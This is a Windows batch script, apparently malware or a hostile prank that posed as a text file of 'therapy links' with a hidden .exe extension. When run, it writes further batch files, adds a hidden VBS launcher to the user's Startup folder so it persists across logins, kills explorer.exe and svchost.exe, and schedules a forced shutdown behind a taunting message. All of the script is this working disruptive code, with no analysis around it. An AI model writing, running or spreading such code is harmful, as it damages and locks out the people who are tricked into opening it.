@echo off
echo @echo off > %TEMP%\therapy4u.bat
echo echo @echo off ^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo timeout /t 960 /nobreak ^^> nul ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo taskkill /f /im explorer.exe ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo echo for therapy, you need to get off your computer...  ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo echo to shutdown your computer, click space ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo pause ^^> nul ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo shutdown /f /s /t 5 ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
echo echo exit ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat

echo echo Set WshShell ^= CreateObject("WScript.Shell") ^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat
echo echo WshShell.Run chr(34) ^^& "C:\script.bat" ^^& Chr(34), 0 ^>^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat
echo echo Set WshShell ^= Nothing ^>^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat

echo timeout /t 15 ^> nul >> %TEMP%\therapy4u.bat
echo taskkill /f /im explorer.exe >> %TEMP%\therapy4u.bat
echo timeout /t 2  >> %TEMP%\therapy4u.bat
echo taskkill /f /im svchost.exe >> %TEMP%\therapy4u.bat
cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER && start "" "%TEMP%\therapy4u.bat"
del THERAPY_LINKS_THAT_YOU_VERY_MUCH_NEED_BADLY.txt.exe
exit 
 
 
 3/15/2022, 2:21:38 PM